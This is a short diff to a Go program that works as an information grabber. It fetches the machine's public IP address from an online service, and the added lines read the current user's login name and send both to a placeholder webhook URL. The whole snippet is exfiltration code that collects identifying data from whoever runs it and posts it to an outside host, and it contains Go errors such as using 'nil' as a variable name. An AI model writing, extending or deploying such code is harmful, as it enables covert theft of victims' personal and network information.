@@ -5,15 +5,18 @@ import (
 	"log"
 	"net/http"
 	"net/url"
+	"os/user"
 )
 
 func main() {
 	urls := "Enter Webhook Here"
+	user, err := user.Current()
 	ips, nil := http.Get("https://api.myip.com")
 	body, err := ioutil.ReadAll(ips.Body)
+	username := user.Username
 	ip := string(body)
 	datas := url.Values{
-		"content": {"There Ip Address:" + ip},
+		"content": {"There Ip Address:"+ ip +"There Pc Username:\n"+ username},
 	}
 	resp, err := http.PostForm(urls, datas)
 
